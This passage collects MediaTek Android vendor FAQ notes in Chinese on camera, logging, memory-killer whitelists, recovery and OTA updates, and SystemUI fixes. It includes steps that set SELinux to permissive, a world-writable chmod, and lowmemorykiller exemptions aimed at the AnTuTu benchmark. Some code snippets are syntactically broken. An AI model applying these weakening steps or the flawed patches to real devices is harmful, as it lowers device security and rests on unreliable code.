由于Record和Previewcallback在Pass2是公用同一输出，所以在录像的时候Previewcallback正常情况下是没有数据的。很多客户希望获取Previewcallback的数据，那么就需要从display输出中copy数据给Previewcallback，再callback给AP。所有的数据格式都是yv12的，如果AP设置NV12或者NV21的格式，可能会出现彩色条纹，所以请客户自行在copy的时候进行格式的转换。
具体的修改方式如下：

一.K2以上平台的修改方法如下：

修改文件路径：/vendor/mediatek/proprietary/hardware/mtkcam/legacy/platform/<ProjectName>/v1/adapter/CamNode/DefaultBufHandler.cpp

1. private内添加变量
MBOOL                       misVideo;//Add by mtk

2.函数enqueBuffer(MUINT32 const data, IImageBuffer const * pImageBuffer)内
case eBuf_Rec: {
    bufProvider = mspImgBufProvidersMgr->getRecCBPvdr();
    misVideo = MTRUE;//Add by mtk
    break;
}

case eBuf_AP: {
    misVideo = MFALSE;//Add by mtk
    bufProvider = mspImgBufProvidersMgr->getPrvCBPvdr();
    const_cast<ImgBufQueNode*>(&keepImgBufQueNode)->setCookieDE(0); // 0 for preview
    break;
}

3.bufProvider->enqueProvider(keepImgBufQueNode);后添加

// Add by mtk start
if(misVideo) {
    sp<IImgBufProvider> PreviewBufProvider;
    PreviewBufProvider = mspImgBufProvidersMgr->getPrvCBPvdr();
    ImgBufQueNode Previewnode;
    if (PreviewBufProvider != 0 && PreviewBufProvider->dequeProvider(Previewnode)) {
        MY_LOGD("APCallback size:%d, APClient size:%d", Previewnode.getImgBuf()->getBufSize(), keepImgBufQueNode.getImgBuf()->getBufSize());
        if ( Previewnode.getImgBuf()->getBufSize() >= keepImgBufQueNode.getImgBuf()->getBufSize()) {
            MY_LOGD("APCallback addr:0x%x, APClient addr:0x%x", Previewnode.getImgBuf()->getVirAddr(), keepImgBufQueNode.getImgBuf()->getVirAddr());
            memcpy(Previewnode.getImgBuf()->getVirAddr(),
            keepImgBufQueNode.getImgBuf()->getVirAddr(),
            keepImgBufQueNode.getImgBuf()->getBufSize());
            const_cast<ImgBufQueNode*>(&Previewnode)->setStatus(ImgBufQueNode::eSTATUS_DONE);
        } else {
            MY_LOGE("APClient buffer size < Record buffer size");
            const_cast<ImgBufQueNode*>(&Previewnode)->setStatus(ImgBufQueNode::eSTATUS_CANCEL);
        }
        PreviewBufProvider->enqueProvider(Previewnode);
    }
}
//Add by mtk end

二.MT6580,MT6735M的修改如下

修改的文件路径：
/vendor/mediatek/proprietary/hardware/mtkcam/legacy/platform/<ProjectName>/v1/hal/adapter/MtkDefault/Preview/PreviewBufMgr.cpp

1.添加private变量
MBOOL                         mIsVideo;//Add by mtk

2.函数enqueBuffer(ImgBufQueNode const& node)内添加

1)
case eBuf_Disp: {
sp<IImgBufProvider> bufProvider = mspImgBufProvidersMgr->getDisplayPvdr();
if (bufProvider != 0) {
    bufProvider->enqueProvider(node);
}
//Add by mtk start

if (mIsVideo) {
    // If preview cb exists, copy to it
    bufProvider = mspImgBufProvidersMgr->getDisplayPvdr();
    ImgBufQueNode PrvCBnode;
    if (bufProvider != 0 && bufProvider->dequeProvider(PrvCBnode)) {
        if (PrvCBnode.getImgBuf()->getBufSize() >= node.getImgBuf()->getBufSize()) {
            memcpy(PrvCBnode.getImgBuf()->getVirAddr(),
            node.getImgBuf()->getVirAddr(),
            node.getImgBuf()->getBufSize());
            const_cast<ImgBufQueNode*>(&PrvCBnode)->setStatus(ImgBufQueNode::eSTATUS_DONE);
        } else {
            MY_LOGE("preview cb buffer size < ap buffer size");
            const_cast<ImgBufQueNode*>(&PrvCBnode)->setStatus(ImgBufQueNode::eSTATUS_CANCEL);
        }
        //
        bufProvider->enqueProvider(PrvCBnode);
    }
}
//Add by mtk end
2)
case eBuf_AP: {
    mIsVideo = MFALSE;//Add by mtk

3)
case eBuf_Rec: {
    mIsVideo = MTRUE;//Add by mtk

3.析构函数中添加

PreviewBufMgr::PreviewBufMgr(sp<ImgBufProvidersManager> &rImgBufProvidersMgr) : mspImgBufProvidersMgr(rImgBufProvidersMgr), mspHwBufPvdr(new HwBuffProvider()) {
    mIsVideo = MFALSE;//Add by mtk
}
```

## [log]  [FAQ11603]  如何在发生java层的out of memory时自动抓取对应进程的hprof

```text
在Monkey等自动化测试时，需要在出现java的out of memory问题时自动抓取hprof文件(hprof会自动打包到aee_exp的db文件中)

1. 需要先从mainlog确认是否有合入DVM和AEE两部分的Patch.
   mainlog中有出现如下log, 代表有合入DVM部分的patch
   01-01 15:42:20.636  1310  1310 D dalvikvm: not gen hprof when oome
   mainlog中有出现如下log, 代表AEE部分的patch有合入
   01-01 15:42:21.407 12001 12001 E AEE/DUMPSTATE: copy_file: Copy /data/anr/1310.hprof to PROCESS_OOME_HPROF failed(2), No such file or directory 

2. 对应不同软件版本上的Patch ID：
   ALPS.JB2.MP：ALPS00692776
   ALPS.JB3.MP ALPS.JB3.TDD.MP: ALPS00828917 
   ALPS.JB5.MP: ALPS01210674+ ALPS00870675
   JB9.MP以及KK之后的版本已经包含所需patch

3. 再保证有合入patch的前提下，还请按照如下方法在ENG版本上测试：
    3.1. 连上adb执行如下命令（会自动重启，把电池开机后属性会无效，需要重新输入）：
          adb shell setprop dalvik.vm.oome-hprof-path  /data/anr
          adb shell chmod 0777 /data/anr/
          adb shell stop
          adb shell start
    3.2. 开完机后清除mtklog文件夹，再开启mobilelog.
    3.3. 然后复制问题，出现问题后等几分分钟，然后将mtklog发过来。

4.针对L版本需要做如下的修改

/art/runtime/Android.mk

ifeq ($(TARGET_ARCH), $(filter $(TARGET_ARCH), arm arm64))
  ifeq ($(TARGET_BUILD_VARIANT), eng)
    # MTK add dump hprof when OOME
    #LIBART_CFLAGS += -DMTK_DUMP_HPROF_WHEN_OOME
    ifneq ($(strip $(MTK_EMULATOR_SUPPORT)), yes)
      # MTK add dump reference table usage when table overflow
      #LIBART_CFLAGS += -DMTK_DEBUG_REF_TABLE
    endif
  endif
endif
endif #MTK_EMULATOR_SUPPORT

LIBART_CFLAGS += -DMTK_DUMP_HPROF_WHEN_OOME     #打开宏开关

M 版本目前不支持。
```

## [FAQ18172]  Andorid M版本上手电筒不亮

```text
在Android M版本上，如果我们使用的闪光灯是透过LED2 的driver去实际控制打闪的，在下拉菜单中
点击手电筒会不亮。
 
[SOLUTION] 
M版本的手电筒是透过flash_hal.cpp 来控制的，默认的source code中只会下command去控制LED1。如果闪光灯实际上是通过LED2的driver去控制，那么我们需要添加对LED2的控制，如下code中所示。（add for led2是需要添加的内容）
 
setTorchOnOff(MINT32 i4SensorOpenIndex, MBOOL en) {
    MINT32 i4SensorDevId = (!m_pHalSensorList)? 0: m_pHalSensorList->querySensorDevIdx(i4SensorOpenIndex);
    if(i4SensorDevId==2 && cust_isSubFlashSupport()==0)
        return 1;
    StrobeDrv* pStrobe = StrobeDrv::getInstance(i4SensorDevId);
    StrobeDrv* pStrobe2 = StrobeDrv::getInstance(i4SensorDevId,2);//add for led2
    if(en==1){
        pStrobe->init();
        pStrobe->setDuty(0);
        pStrobe->setTimeOutTime(0);
        //add for led2
        pStrobe2->init();
        pStrobe2->setDuty(0);
        pStrobe2->setTimeOutTime(0);
        //add end
        pStrobe->setOnOff(1);
        pStrobe2->setOnOff(1);//add for led2
        m_status = 1;
    }else{
        pStrobe->setOnOff(0);
        pStrobe->uninit();
        //add for led2 
        pStrobe2->setOnOff(0);
        pStrobe2->uninit();
        //add end
        m_status = 0;
    }
    return 0;
}
```

## [FAQ18149]  Antutu跑分低排查建议

```text
建议参考下述步骤排查：
1、请与贵司Power、Thermal相关同仁确认是否因为功耗、温升等问题修改过可能影响performance的代码及配置，比如CPU限核、限频等。如有，请还原为Mediatek原始状态进行测试。
2、请参考下面FAQ重新测试：
     FAQ12284  Benchmark Tool 跑分测试注意事项
3、请在冰箱环境中测试，统计并对比常温、冰箱中测试数据。
     Note*: 冰箱环境中，并非温度越低越好，比如电池在冰冻环境中比较容易打到低电量导致的CPU限核及限频。建议选取在-10℃、-5℃、0℃分别测试看看。
4、请关闭thermal throttle后，分别在冰箱、常温下进行测试，统计并对比相关测试数据。关闭方法参考下面FAQ:
     FAQ14794  How to disable thermal throttling
5、请测试CPU performance mode（全核全频率）下跑分，分别在冰箱、常温下进行测试，统计并对比相关测试数据。方法可以咨询贵司Power同仁。 
6、请使用Driver Only版本测试，统计并对比相关测试数据。
7、如果1~6排查下来仍有疑问，请提eservice处理，同时提供下面数据（统计到Excel表格中），格式如下：
```

## [FAQ21495] 安兔兔跑分中断

```text
是因为 antutu 的应用占用内存太大被lmkd杀死了

/system/core/lmkd/lmkd.c
(1)
/* Kill one process specified by procp.  Returns the size of the process killed */
static int kill_one_process(struct proc* procp, int min_score_adj, bool is_critical) {
    int pid = procp->pid;
    uid_t uid = procp->uid;
    char *taskname;
    int tasksize;
    int r;

    taskname = proc_get_name(pid);

    // add 
    char packageName[30]  = {""};
    strncpy(packageName, taskname, sizeof("com.antutu.ABenchMark:push"));
    
    if(!strcmp(packageName,"com.antutu.ABenchMark:push")){
    return -1000;
    }
    strncpy(packageName, taskname, sizeof("com.antutu.ABenchMark"));
    
    if(!strcmp(packageName,"com.antutu.ABenchMark")){
    return -1000;
    }
    strncpy(packageName, taskname, sizeof("com.antutu.ABenchMark:refinery"));
    
    if(!strcmp(packageName,"com.antutu.ABenchMark:refinery")){
    return -1000;
    }
    
    // add end


(2)
retry:
    procp = proc_adj_lru(i);
    if (procp) {
        killed_size = kill_one_process(procp, min_score_adj, is_critical);
        /* MTK add */
        if(killed_size == -1000){
            ALOGE("MTK_killed_size == -1000 and jump kill_one_process");
        }
        /* mtk add end 


3.18/drivers/staging/android/lowmemorykiller.c
(3)

rcu_read_lock();
for_each_process(tsk) {
    struct task_struct *p;
    /* mtk begin */
    if(tsk->comm){
    if((strstr(tsk->comm,"tutu.ABenchMark")!=NULL)
        ||(strstr(tsk->comm,"ABenc  hMark:push")!=NULL)
        ||(strstr(tsk->comm,"benchmark:full")!=NULL))
        ||(strstr(tsk->comm,"chMark:refinery")!=NULL)){
            lowmem_print(1,"mtk_lowmemorykiller_2\ jump kill 'tutu.ABenchMark' 'ABenchMark:push' 'benchmark:full' 'myapplication'\n");
            continue;
        }
    }
    /* mtk end */

Thanks
```

## [性能]  [FAQ21508]  framework 内存管理优化

## [性能]  [FAQ21495]  lmk (lowmemorykiller) and lmkd 白名单

```text
lowmemorykiller 可能误杀一些进程，比如 测试测序，特别重要但占用内存比较大的程序等，可能使用到添加白名单的方法，避免被误杀
 
[SOLUTION] 
（一）首先看是lowmemroy 还是  lmkd
查看方法看: 两种
（1）/sys/module/lowmemorykiller/parameters/adj  里面的值
0,0,0,0,0,0 → lmkd  //o版本是没有这个值的
0,100,200,300,900,906  → lowmemorykiller 

（2）看“lowmemroykiller” 出现的位置
kernel log→ lowmemorykill
main log → lmkd 

(二)
判断好了后根据两种方式加入白名单，也可以都加入：
注意更改方法是 o 版本的更改方法，其他版本稍有变化
LMKD

1.
\system\core\lmkd\lmkd.c

/* Kill one process specified by procp.  Returns the size of the process killed */
static int kill_one_process(struct proc* procp, int min_score_adj, bool is_critical) {
    int pid = procp->pid;
    uid_t uid = procp->uid;
    char *taskname;
    int tasksize;
    int r;

    taskname = proc_get_name(pid);
    /* MTK begin */

    char packageName[20]  = {""};
    strncpy(packageName, taskname, sizeof("com.antutu"));
    ALOGE("MTK_packageName=%s,taskname=%s,strcmp=%d",packageName,taskname,strcmp(packageName,"com.antutu"));
    if(!strcmp(packageName,"com.antutu")){
        return -1000;
    }
    /* MTK end */

2.

o版本
\system\core\lmkd\lmkd.c

static int find_and_kill_process(bool is_critical) {
    int i;
    int killed_size = 0;
    int min_score_adj = is_critical ? critical_oomadj : medium_oomadj;

    for (i = OOM_SCORE_ADJ_MAX; i >= min_score_adj; i--) {
        struct proc *procp;
retry:
        procp = proc_adj_lru(i);

        if (procp) {
            killed_size = kill_one_process(procp, min_score_adj, is_critical);

            /* MTK begin*/
    if(killed_size == -1000){
                ALOGE("MTK_killed_size == -1000 and jump kill_one_process");
            }else if (killed_size < 0) {
    /* MTK end */
                goto retry;
            } else {
                return killed_size;
            }
        }
    }

p版本
由于p版本这个地方google进行了更新，可能部分版本可以参照上面的的方法，如果发现有更改则使用下面的更改方法
\system\core\lmkd\lmkd.c
static int find_and_kill_process(bool is_critical) {
..
break;

killed_size = kill_one_process(procp, min_score_adj, level);
/* MTK begin*/
if(killed_size == -1000){
    ALOGE("MTK_killed_size == -1000 and jump kill_one_process");
    continue;
}
/* MTK end*/
if (killed_size >= 0) {
#ifdef LMKD_LOG_STATS
if (enable_stats_log && !lmk_state_change_start) {
    lmk_state_change_start = true;
    stats_write_lmk_state_changed(log_ctx, LMK_STATE_CHANGED,
    LMK_STATE_CHANGE_START);
}

lowmemroykiller

3.18/drivers/staging/android/lowmemorykiller.c
(3)
rcu_read_lock();
for_each_process(tsk) {
struct task_struct *p;
short oom_score_adj; 

//lowmem_print(1,"mtk jump lowmemorykiller_1 tsk->comm=%s",tsk->comm);
/* mtk begin */
if(tsk->comm){
if((strstr(tsk->comm,"tutu.ABenchMark")!=NULL)
    ||(strstr(tsk->comm,"ABenchMark:push")!=NULL)
    ||(strstr(tsk->comm,"benchmark:full")!=NULL))
    ||(strstr(tsk->comm,"chMark:refinery")!=NULL)){
     lowmem_print(1,"mtk_lowmemorykiller jump kill 'tutu.ABenchMark' 'ABenchMark:push' 'benchmark:full' \n");
     continue;
     }
}
/* mtk end */

添加白名单的名字是如何确定的?

搜索关键字lowmemorykiller，killing 的 apk  name 就添加到上面的代码中就可以了

11-30 11:08:03.668 <6>[10425.252789]  (3)[92:kswapd0] lowmemorykiller: Killing 'android.vending' (23456) (tgid 23456), adj 100,
11-30 11:08:03.839 <6>[10425.423820]  (2)[92:kswapd0] lowmemorykiller: Killing 'magazineservice' (9338) (tgid 9338), adj 100,
11-30 11:08:03.868 <6>[10425.452692]  (1)[92:kswapd0] lowmemorykiller: Killing 'dboxed_process0' (16792) (tgid 16792), adj 100,
11-30 11:08:03.904 <6>[10425.488277]  (1)[92:kswapd0] lowmemorykiller: Killing 'hbox:interactor' (9455) (tgid 9455), adj 100,
11-30 11:08:04.112 <6>[10425.696791]  (3)[92:kswapd0] lowmemorykiller: Killing 'ssion.appupdate' (9323) (tgid 9323), adj 100,
11-30 11:08:04.222 <6>[10425.807027]  (3)[92:kswapd0] lowmemorykiller: Killing 'android.smspush' (9561) (tgid 9561), adj 100,
11-30 11:08:04.370 <6>[10425.955053]  (1)[92:kswapd0] lowmemorykiller: Killing 'MainThread-UE4' (18741) (tgid 18741), adj 0,

LMKD 不是这样添加的
```

## [FAQ12284]  Benchmark Tool 跑分测试注意事项

```text
1.使用Benchmark Tool，例如Antutu等对手机进行跑分测试时，建议使用user build + driver only测试；若没有driver only load，请务必使用user 版本(关掉log)来run benchmark tool

2.Run Benchmark Tool时建议:
    手机恢复出厂设置，再安装Benchmark APK;
    测试APK前重启手机，等待一分钟，等手机稳定后再进行测试，每测完一次，等待一分钟，再进行测试,测四次，取后三次平均值;

3.测试机与参考机分值差在10%以内，我们认为是正常的。

4.附上内部常用benchmark Tool apk list供您参考

CaffeineMark 
Linpack for Android
Nbench 
CoreMark(AndEBench)
Quadrant Advanced
Antutu benchmark 
Smartbench 2012
CF-Bench 
FPS2D 
Benchmark
0xBench
NenaMark2
An3DBenchXL 
Electopia 
3DRating Benchmark
Vellamo 
BrowserMark
Sunspider 
AndroBench
RL Benchmark:SQLite
```

## [性能]  [lmkd]  [lowmemorykiller] 80Go512M项目出现大量apk闪退，报错及CTS/CTSV测试不起来问题

```text
修改 build/target/product/go_defaults_512.mk
PRODUCT_PROPERTY_OVERRIDES += \
    ro.lmk.medium=700

将这里的700修改为750，再测试看看
```

## [FAQ18152]  [AudioProfile] 第一次开机，来电话没有来电铃声

```text
第一次开机的时候，没有来电铃声，甚至drive only版本也是如此。 正常情况下，第一次开机的时候，是要响默认铃声。
同样的版本，在客户端没有问题，而在客户的客户端却有问题。
[SOLUTION] 
问题原因：
有第三方将ringtone_set的值初始化为1
解决办法：
以work around 的方法解决：
private boolean doesSettingEmpty(String settingName) {
    String existingSettingValue = Settings.System.getString(mContext.getContentResolver(), settingName);
    /*   删掉如下
    if (TextUtils.isEmpty(existingSettingValue)) {
        return true;
    }
    return false;
    */

//改为如下：
Log.d(TAG, "Mits doesSettingEmpty settingName:" + settingName + " existingSettingValue:"+existingSettingValue);
if (TextUtils.isEmpty(existingSettingValue)) {
    return true;
}else if(existingSettingValue.equals("yes")){
    return false;
}else
    return true;
}

也就是说，我们避开去判断第三方设置为1这个值，在初始化时，只有为"yes"，才认定为已经设置来电铃声的默认值，否则，就认为没有设定默认值。
```

## [selinux]  [FAQ14482]  [Recovery]  [Others] 如何在recovery mode下单独关闭selinux 而不影响normal mode

```text
参考 FAQ11484[SELinux]  如何设置确认selinux 模式，
可以在开机一启动就设置selinux模式，  但这是针对所有模式。 
如果只想在recovery mode下关闭而不影响normal mode，以下提供方法。 

[SOLUTION] 
修改  /bootable/bootloader/lk/app/mt_boot/mt_boot.c

+if(g_boot_mode == RECOVERY_BOOT){ //<----添加这行
+sprintf(commanline, "%s androidboot.selinux=permissive", commanline); //<----添加这行
+}else{ //<----添加这行
#ifdef SELINUX_STATUS
#if SELINUX_STATUS == 1
sprintf(commanline, "%s androidboot.selinux=disabled", commanline);
#elif SELINUX_STATUS == 2
sprintf(commanline, "%s androidboot.selinux=permissive", commanline);
#endif
#endif
+}//<----添加这行
 
在L版本上，因user版本默认无法关闭selinux, 如果要对user 版本有效,
同样需要修改 system/core/init/Android.mk ，新增
LOCAL_CFLAGS += -DALLOW_DISABLE_SELINUX=1
```

## [ota]  [FAQ12491]  [Recovery mode]  [Common]  选择"apply update from sdcard"直接进入data/目录是否正常?

```text
Recovery mode 选择"apply update from sdcard"直接进入data/目录，说明您开了MTK_SHARED_SDCARD宏；请检查下贵司project下的projectconfig.mk文件，谢谢！
至于开了share sd功能后的升级方案：请参考：
ID: FAQ12477
关于打开MTK_SHARED_SDCARD宏后MTK目前升级方案
KK 版本默认是支持在打开MTK_SHARED_SDCARD宏后从内卡升级，即从/data/media/下面选取升级包升级；但这种情况有些Limitation；详情见FAQ12477。
[SOLUTION] 
这种现象是正常的！ 谢谢！
```

## [sdcard]  [FAQ12477]  [Recovery]  [Common] 关于打开MTK_SHARED_SDCARD宏后MTK目前升级方案

```text
如果设置宏MTK_SHARED_SDCARD=yes；默认是把升级包放到外置SD卡才能升级成功。即这种情况下不支持内卡升级。
因为此时只有data/ 目录，sdcard0 其实变成了/data/media/；如果支持从内卡升级，有如下Limitation：
1、因為android 有對 /data 加密的功能, 在加密的情況下OTA 就無法將升級包下載至 /data recovery 也無法從 /data 下取得升級包升級.
2、除了加密的限制, 另外的 limitation 是, 如果 /data 分区的起始地址有更動我們升級時會擋下, 因為/data的資料無法 backup 和 restore. 所以客戶需確認兩版的 /data 起始地址也不能改變.
```

## [sdcard]  [FAQ12478]  [Recovery]  [Common] 关于打开MTK_SDCARD_SWAP 宏后MTK目前升级方案

```text
如果设置宏MTK_SDCARD_SWAP=yes；默认是优先从外卡获取升级包，外卡没有包，才会去内卡获取！
1. 插入外卡，升级包update.zip放入外卡，升级可以成功！
2. 插入外卡，升级包update.zip放入内卡，升级失败，提示：找不到升级包！
3. 未插入外卡，升级包update.zip放入内卡，升级成功！
```

## [FAQ18188]  [Recovery]  [Common] Android M 版本如何升级logo等rawdata分区方法?

```text
参考FAQ17441[Recovery]  [Common] Android M 版本如何升级lk 、preloader ?可以升级lk和preloader，那如何升级logo等其他的rawdata分区呢?
根据MTXXXX_Android_scatter.txt文件是否存在is_upgradable分成两种情况
 
一.存在is_upgradable关键字
修改方法
修改partition table中的OTA_Update，将需要升级的分区的N改成Y。

二.不存在is_upgradable关键字
修改方法：
在FAQ17441的基础上，另外加入下面的修改
 
修改/device/mediatek/build/releasetools/mt_ota_preprocess.py

if os.getenv("MTK_LOADER_UPDATE") is not None and os.getenv("MTK_LOADER_UPDATE") == "yes":
if "lk" not in upgrade_list_include:
upgrade_list_include.append("lk")
if "preloader" not in upgrade_list_include:
upgrade_list_include.append("preloader")
加入
+ if "logo" not in upgrade_list_include:
+ upgrade_list_include.append("logo")
其他的rawdata分区，可以参考加入。
```

## [FAQ14091]  如何在Recent App不显示某个应用

```text
长按HOME键或者Navigation bar的recent key在最近应用程序列表中会显示最近访问过的应用，如何做到不显示某应用以达到隐藏进程的目的呢?
[SOLUTION] 
为该应用AndroidManifest xml文件中主activity设置属性：android:excludeFromRecents="true"
例如：
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.mingli.test"
    android:versionCode="1"
    android:versionName="1.0">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:name=".HttpTest"
                  android:excludeFromRecents="true"
                  android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>        
    <uses-sdk android:minSdkVersion="3" />
</manifest>
```

## [FAQ13927]  如何取消Heads-Up Notification方式

```text
1. 从Android 5.0开始，如果notification  priority设置为HIGH, MAX, 或者fullscreenIntent不为空，在非锁屏界面收到notification时屏幕上方会显示一个小悬浮窗口提醒用户，方便用户在不退出当前浏览界面的前提下快速响应该notification，即Heads-Up Notification(简称HUN)。如下图：

2. 如需禁止某个应用notification以HUN方式显示，又不想降低notification priority或者拿掉fullscreenIntent，毕竟这两种方式会改变notification其他行为。
work around方法是在baseStatusbar.java中根据需求客制化interrupt值。
例如，要禁止来电以Heads-Up Notification方式显示，可修改如下：
```

## [FAQ13742]  添加“一键删除最近应用列表”功能

```text
在RecentActivity界面添加“一键删除最近应用列表”按钮，其实现分两个部分：
1. 在RecentActivity界面添加一个button，点击该button触发一键删除功能，请您根据需求添加在合适位置。
2. 在button的onclick()方法中，通过调用AMS接口来删除AMS记录的recent list。请通过如下方式来实现：
final ActivityManager am = (ActivityManager)mContext.getSystemService(Context.ACTIVITY_SERVICE);
final List<ActivityManager.RecentTaskInfo> recentTasks = am.getRecentTasks(MAX_TASKS, ActivityManager.RECENT_IGNORE_UNAVAILABLE);
for(ActivityManager.RecentTaskInfo rt:recentTasks ) {
    if (am != null) {
        am.removeTask(rt.persistentId, ActivityManager.REMOVE_TASK_KILL_PROCESS);
    }
}
```

## [FAQ12395]  Notification列表中的日期格式和Setting的不一致

```text
这个是google设计的默认问题，按照如下修改可以解决，
DateTimeView.java（frameworks/base/core/java/android/widget）
private DateFormat getDateFormat() {
    String format = Settings.System.getString(getContext().getContentResolver(), Settings.System.DATE_FORMAT);
    if (format == null || "".equals(format)) {
        return DateFormat.getDateInstance(DateFormat.SHORT);
    } else {
        try {
            //return new SimpleDateFormat(format);///注释此行，使用下面的替代
            return android.text.format.DateFormat.getDateFormat(getContext());
        } catch (IllegalArgumentException e) {
            // If we tried to use a bad format string, fall back to a default.
            return DateFormat.getDateInstance(DateFormat.SHORT);
        }
    }
}
```

## [语言]  [FAQ10475]  切换系统语言，拉下状态栏发现状态栏内容没有同步更新

```text
切换系统语言，拉下状态栏发现状态栏内容没有同步更新
例如：
1、手机插入USB，切换系统语言之后，下状态栏发现，USB相关的状态栏通知内容没有同步更新，还是切换前的语言文字内容。

[SOLUTION] 
这是Google default design，google原生对比机nexus是一样的行为现象。因为：
1. Statusbar 无法控制是否改语言，只负责显示App发送的通知中所携带的字串和图片内容。
2. 如果需要翻译由各个app决定。
3. 到底变不变对于end users来说都是可以接受的，因为改变语言是主动行为，user是可以接受某条临时notification没有变化的情况的
请知悉，谢谢！
```

## [FAQ12130]  [Recovery]  [Common] 如何通过adb command 完成自动SD卡升级?

```text
通过adb 命令的方式，免去了按powerkey+volumeup进入menu select以及recovery mode的不便。可以把命令放到.bat档。只要包的路径设置正确，可以实现在PC端一键升级。
1. Insert SD card with  OTA package，下面以OTA包放到内卡为例；
[Step] 
1、正常开机模式下：手机连接usb成功。
2、输入adb cmd： adb shell "echo \"--update_package=/sdcard/update.zip\" > /cache/recovery/command"
3、输入：adb reboot recovery
```

## [FAQ08109]  [Recovery]  [Common] 在recovery mode下同时挂载内置T卡和外置T卡

```text
目前recovery mode下只支持挂载内置T卡或者外置T卡一种，如果想同时挂载内置T卡和外置T卡，请参考以下方法
[SOLUTION] 
1，
Add -DSUPPORT_SDCARD2 in bootable/recovery/Android.mk
ifeq ($(WITH_BACKUP_RESTORE),true)
LOCAL_CFLAGS += -DSUPPORT_DATA_BACKUP_RESTORE -DSUPPORT_SDCARD2
Endif
 
2，
recovery.fstab的优先级是project > platform > common，还请根据项目的具体情况来修改recovery.fstab。比如，project的fstab需要修改alps/mediatek/config/<project>/recovery_xxx.fstab。
具体修改，还请仿照以下方法新增加一行
a) KK前的版本
emmc为：
/sdcard2  vfat  /dev/block/mmcblk1p1 /dev/block/mmcblk1
nand为：
/sdcard2  vfat  /dev/block/mmcblk0p1 /dev/block/mmcblk0
 
b) KK版本
emmc为：
/dev/block/mmcblk1p1 /sdcard2 vfat  defaults defaults
nand为：
/dev/block/mmcblk0p1 /sdcard2 vfat defaults defaults
 
3，
重新编译整个工程
```

## [FAQ04559]  [Recovery]  [Common] 从JB版本开始支持adb sideload命令

```text
从JB版本开始支持adb sideload命令,adb sideload命令的优势在于我们不必将制作好的升级包拷贝到SD卡或T上上！adb sideload是支持将升级包存于电脑上然后通过abd sideload命令进行直接对手机进行升级！

[Solution] 

具体的操作过程如下：
1，同时按下手机power和音量上键进入recovery mode，
2，然后选择“apply update from ADB"这一项并确定
3，用usb线连上手机和电脑，（确保usb转串口驱动安装完好）
4，在电脑端点击 开始——运行，在里面输入 adb sideload $path,(其中$path 代表的是升级包在电脑上的具体路径）
```

## [FAQ07941]  [HFP] 蓝牙车载和蓝牙耳机的区别

```text
蓝牙耳机：市面上，双声道蓝牙耳机大多数支持HFP(手机音频) 和 A2dp(媒体音频) 和AVRCP(音/视频控制)这三个Profile；
             单声道蓝牙耳机大多数只支持HFP，部分会同时支持HFP 和 A2dp。
 
蓝牙车载：分为外置式和内置式，外置式是一台可携带的蓝牙设备，内置式是集成在车辆上的，随原车一起购买。车载
             大多数都支持HFP、A2dp、AVRCP 这三个Profile，有显示屏的车载还会支持PBAP(电话本访问协议)，这样可以
             从车载上直接进行拨打电话操作。
 
所以从蓝牙系统应用(Profile) 角度看，蓝牙车载和蓝牙耳机本质上没有区别，只是车载的功能会多一些。
```

## [log]  [FAQ07939]  [Debug] 如何抓取蓝牙空中数据包(Air Sniffer)

```text
1、抓取 Sniffer Log 需要专门的蓝牙Sniffer工具才能抓取，可以截取蓝牙通信双方的空中数据包，分析交互双方的行为等，目前敝司使用的 Frontline  公司和Ellisys 公司生产的蓝牙Sniffer 工具，抓取方式可以参考该工具的官方帮助文档。
 
2、抓取蓝牙Air Sniffer时，需要输入配对后产生的Link Key，目前敝司在JB 和 JB2 版本上获取Link key 的方法
如下：
 
1、手机连接ADB
2、输入 adb shell btconfig 6，即会打印出Link Key 和 对方设备蓝牙地址。

Sniffer工具哪里下载????怎么用???
```

## [log]  [FAQ18155]  factory mode/meta mode如何抓log

```text
factory mode/meta mode如何抓log?
factory mode/meta mode下会将log存到外卡中。将外置SD卡插入手机，即可抓取log至外卡。
 
factory mode/meta mode抓不到log怎么办?
1.先确认，有插入外置SD卡
2.确认外卡能正常识别
adb shell进/storage下看是否有外卡
3.mobile_log_d这个抓log的daemon有在运行
查看手机 factory_init.rc 里是否有以下code：
service mobile_log_d /system/bin/mobile_log_d
class main
或adb shell ps | grep mobile_log_d查看daemon是否运行
4.M版本还需检查一下selinux权限
/device/mediatek/common/sepolicy/mobile_log_d.te中若无需添加下面两句：
allow mobile_log_d mnt_media_rw_file:dir {search create_file_perms};
allow mobile_log_d mnt_media_rw_file:file create_file_perms;
```

## [sysui]  [FAQ18077]  Android L之后，状态栏图标资源的编辑

```text
Android L之后，google逐渐采用VectorDrawable这种矢量图代替传统的png应用到状态栏上。
矢量图的优点是与像素无关，systemUI的矢量图统一放在frameworks\base\packages\SystemUI\res\drawable
路径下，可以将它缩放到任意大小和以任意分辨率在输出设备上打印出来，都不会影响清晰度。
最新版本的Android Studio支持解析xml文件描述的矢量图所输出的图片样式。
 
客户如果想客制化状态栏上的矢量图，有以下方法：
1. 用png代替。 谨记需提供不同分辨率设备所需的png资源，放在对应density的的res\drawable_xxx 路径下。
2. 制作xml矢量图。google未提供制作工具，目前市面上有收费软件Adobe Illustrator (AI) CS6可以制作，如果有兴趣可以向mtk提交e-service申请该工具参考文档。标题注明SystemUI 关键字。敝司只提供该工具指导文档，具体制作需客户自行研究实现。

Adobe Illustrator (AI) CS6 工具怎么用??
```

## [默认值]  [FAQ08566]  如何修改默认的searchable items

```text
在QuickSearchBox中有个config.xml文件
里面有定义个default_corpora的数组。
修改这个数组的内容就可以更改默认的search-able的值。
例如：
将
<string-array name="default_corpora" translatable="false">
    <item>web</item>
    <item>apps</item>
    <item>com.android.providers.applications/.ApplicationLauncher</item>
</string-array>
修改为
<string-array name="default_corpora" translatable="false">
    <item>web</item>
    <item>apps</item>
    <item>com.android.providers.applications/.ApplicationLauncher</item>
    <item>com.android.mms/.ui.SearchActivity</item>
    <item>com.android.contacts/com.mediatek.contacts.activities.CallLogSearchResultActivity</item>
</string-array>
上面就添加了mms和calllog.
修改后，重新编译QuickSearchBox.apk ，再push进手机后恢复出厂设置验证.
```

## [FAQ18103]  [Android M]  连接蓝牙耳机，通话过程中，关闭蓝牙，调节音量仍然现象蓝牙音量

```text
问题是 google issue，请按照如下修改:
HeadsetService.java 文件中的stop() 方法： 
protected boolean stop() {
    try {
        unregisterReceiver(mHeadsetReceiver);
    } catch (Exception e) {
